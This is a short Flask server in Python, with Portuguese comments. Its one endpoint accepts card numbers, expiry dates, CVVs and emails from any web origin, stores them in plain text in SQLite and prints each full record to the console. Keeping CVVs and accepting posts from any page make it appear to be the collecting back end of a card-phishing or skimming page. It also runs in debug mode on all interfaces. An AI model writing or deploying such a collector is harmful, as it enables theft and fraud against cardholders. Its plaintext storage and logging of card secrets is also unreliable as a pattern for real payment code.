from flask import Flask, request, jsonify
from flask_cors import CORS
import sqlite3
import os

app = Flask(__name__)
CORS(app)

DB_PATH = "dados.db"

# Criação do banco de dados e da tabela, caso ainda não exista
if not os.path.exists(DB_PATH):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS faturas (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        numero_cartao TEXT NOT NULL,
        validade TEXT NOT NULL,
        cvv TEXT NOT NULL,
        email TEXT NOT NULL
    )
    """)
    conn.commit()
    conn.close()

@app.route('/submit', methods=['POST'])
def submit():
    try:
        data = request.json
        numero_cartao = data.get('cardNumber')
        validade = data.get('validade')
        cvv = data.get('cvv')
        email = data.get('email')  # Captura o email do request

        if not all([numero_cartao, validade, cvv, email]):
            return jsonify({"status": "error", "message": "Todos os campos são obrigatórios."}), 400

        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("""
        INSERT INTO faturas (numero_cartao, validade, cvv, email)
        VALUES (?, ?, ?, ?)
        """, (numero_cartao, validade, cvv, email))
        conn.commit()

        # Imprimir os dados inseridos no console
        print(f"Dados inseridos: Numero Cartão: {numero_cartao}, Validade: {validade}, CVV: {cvv}, Email: {email}")

        conn.close()

        return jsonify({"status": "success", "message": "Todos os campos são obrigatórios."}), 201
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
